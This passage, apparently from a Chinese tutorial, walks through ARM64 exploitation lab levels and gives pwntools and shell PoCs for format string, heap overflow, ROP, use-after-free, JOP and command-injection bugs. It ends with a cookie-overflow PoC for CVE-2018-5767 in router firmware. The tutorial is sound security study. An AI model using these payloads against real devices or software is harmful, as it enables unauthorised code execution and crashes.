#### Level 6: Format string
> [!NOTE] 格式化字符串漏洞 格式化字符串漏洞是比较经典的漏洞之一。 printf
> 函数的第一个参数是字符串，开发者可以使用占位符，将实际要输出的内容，也就是第二个参数通过占位符标识的格式输出。 例如：
> 
> 当第二个参数为空时，程序也可以输出：
> 
> 这是因为，printf从栈上取参时，当第一个参数中存在占位符，它会认为第二个参数也已经压入栈，因此通过这种方式可以读到栈上存储的值。
> 格式化字符串漏洞的典型利用方法有三个： 1\. 栈上数据，如上所述 2\. 任意地址读：
> 当占位符为%s时，读取的第二个参数会被当作目标字符串的地址，因此如果可以在栈上写入目标地址，然后作为第二个参数传递给printf，就可以实现任意地址读
> 3\. 任意地址写： 当占位符为%n时，其含义是将占位符之前成功输出的字节数写入到目标地址中，因此可以实现任意地址写，如：
> 
> 一般配合%c使用，%c可以输出一个字符，在利用时通过会使用
程序逻辑为：
程序逻辑为输入 password，打印 password，判断 v1 是否为 89，是则输出密码。
这里 printf(Password)，Password 完全可控，这里存在格式化字符串漏洞。
通过汇编可以看到：
Arm64 函数调用时前八个参数会存入 x0-x7 寄存器，因此第8个占位符会从栈上开始取参，sp+0x18 是我们需要修改的地址，因此偏移为
7+3=10。
PoC为：
    from pwn import *
    context.arch = 'aarch64'
    context.os = 'linux'
    context.log_level = 'debug'
    payload = '%16lx'*9+'%201c%n' # 16*9+201=345=0x159
    io = process(argv=['./exploit64','happyness'])
    io.sendline(payload)
    print(io.recv())
#### Level 7: Heap overflow
v7 和 v8 都是创建的堆空间，且在 strcpy 时未规定长度，因此可以产生堆溢出，从而覆盖到v7的堆空间，完成判断。
通过 pwngdb 生成测试字符串，在 printf处下断点，查看 v7 是否被覆盖和偏移：
通过 x1 寄存器可知，偏移为 48。
因此 PoC为：
    from pwn import *
    context.arch = 'aarch64'
    context.os = 'linux'
    context.log_level = 'debug'
    payload = 'A'*48 + '\x63\x67'
    io = process(argv=['./exploit64','mypony',payload])
    #io.sendline(payload)
    print(io.recv())
#### Level 8: Structure redirection / Type confusion
一直跟进Msg:Msg：
而在strcpy 下面一行有用 v12 作为函数指针执行，v12 = v2 = &Run::Run(v2)，
因此需要通过strcpy覆盖栈空间上存储的v12，来控制函数执行流。且覆盖为0x4c55a0，从而在取出 v12
当作函数指针执行时可以指向Msg::msg：
根据汇编，v12 存储在 sp+0x90-0x10 = sp+0x80 处，strcpy 从 sp+0x90-0x68 = sp+0x28 处开始，偏移为
0x80-0x28 - 0x8 = 0x50。
因此PoC为：`./exploit64 Exploiter $(python -c 'import
sys;sys.stdout.buffer.write(b"A"*(20*4)+b"\xa0\x55\x4c\x00\x00\x00\x00\x00")')`
#### Level 9: Zero pointers
先使用 gdb 调试， `gdb --args ./exploit64 Gimme a 1`，程序报错：
第二个参数应该填写的是地址：
在程序执行过程中，v4指向的值会被置0，v4指向的是a1的地址，因此a1地址指向的值会变为0。
因此要想完成 v3 的判断，只需要将 v3 地址传入即可。
PoC为`./exploit64 Gimme 0xffffffffec9c 1`:
#### Level 10: Command injection
关键点 `v9 = "man" + *(a2+16)`，v9中要包含 “;” 才可以完成判断。
因此 PoC 为 `./exploit64 Fun "a;whoami"`:
#### Level 11: Path Traversal
PoC为`./exploit64 Violet dir1/dir2/../..`
#### Level 12: Return oriented programming (ROP)
scanf 并未限制长度，因此此处存在溢出，通过pwndbg 的 cyclic 得到偏移为72。
现在目的是跳到 comp 函数中，且参数要为 0x5678：
因此需要构造 Rop Gadget，构造的 Gadget 应该具备以下功能，将comp 判断的地址 0x400784加入lr寄存器(x30),并能执行
ret，这样就可以在溢出时，将程序执行流劫持到 Rop Gadget 的地址。
这样在跳转时这个地址会被压栈作为 Rop 的 ret 的返回地址。
程序给了一个叫 ropgadgetstack 的 rop Gadget：
通过调试可知，x0 和 x1 在 0x400744 执行后都为当前sp寄存器存储的值，因此 0x400784的比较可以正常完成；lr寄存器，也就是x30 =
（0x400744 时）sp+0x10 + 0x8。
输入 `payload = b'A'*72 + p64(0x400744) +
b'BBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJKKKKLLLLMMMMNNNNOOOOPPPP'` 进行调试：
可知，paylad 从 0x400744后，再填充32个字符开始，会覆盖到当前$sp，因此只要再覆盖24个字符后，覆盖为 0x400784 就可以在 ret
执行后跳到 comp 的比较处。payload为 `payload = b'A'*72 + p64(0x400744) + b'B'*32 +
b'C'*16 + b'D'*8 + p64(0x400784)`
#### Level 13: Use-after-free
根据代码逻辑可看出，输入的第二个参数决定了执行 switch 几次以及执行那一个选项，0是 malloc，mappingstr就指向堆块；1是 free；2
是函数指针执行；3是 malloc，且malloc 申请地址后存储的值就是 command。
很明显这是一个Use After Free，通过0创建一个堆块，mappingstr不为空此时再 free
mappingstr，再malloc一个相同大小的堆块，就可以申请到 mappingstr 的堆块，复制 command
到堆块后，再通过函数指针执行。level13password函数地址是 0x4008c4。
因此 payload 为：`payload = b'a' * 64 + p64(0x4008c4)`
执行参数为 0312：
#### Level 14: Jump oriented programming (JOP)
与ROP不同，JOP
是使用程序间接接跳转和间接调用指令来改变程序的控制流，当程序在执行间接跳转或者是间接调用指令时，程序将从指定寄存器中获得其跳转的目的地址，由于这些跳转目的地址被保存在寄存器中，而攻击者又能通过修改栈中的内容来修改寄存器内容，这使得程序中间接跳转和间接调用的目的地址能被攻击者篡改，从而劫持了程序的执行流。
关键点在两个 fread 上，第一个 fread 将文件中的4个字节读到 v2 中，第二个read 又将 v2 作为读取字节数，从 v5 中读取到
v3，v3 分配在栈空间上，因此这里会出现栈溢出。
看汇编会更明显：
通过 gdb 测试，得到偏移为 52。
往一个文件里写入 `data = b'A'*52 + p64(0x400898)`
执行：
### 3.2 CVE 案例
#### CVE-2018-5767
具体分析过程可见：[CVE-2018-5767](https://ryze-t.com/2022/09/02/CVE-2018-5767/)
漏洞触发点在：
此处存在一个未经验证的 sscanf，它会将 v40 中存储的值按照 `"%*[^=]=%[^;];*"` 格式化输入到
v33，但是并未验证字符串长度，因此此处会产生一个栈溢出。
PoC 如下：
    import requests
    url = "http://10.211.55.4:80/goform/execCommand"
    payload = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae' +".png"
    headers = {
    'Cookie': 'password=' + payload
    }
    print(headers)
    response = requests.request("GET", url, headers=headers)
通过远程调试可观察到，在 PoC 执行后：
由于栈溢出，PC 寄存器被覆盖，导致程序执行到错误的内存地址而报错。偏移量为444。
## 0x04 总结
ARM的分析与x86类似，只是在函数调用、寄存器等方面存在差异，相对来说保护机制也较弱，且应用场景更为广泛，如IOT设备、车联网等，如果能顺利完成固件提取，可玩性相对较高。
* * *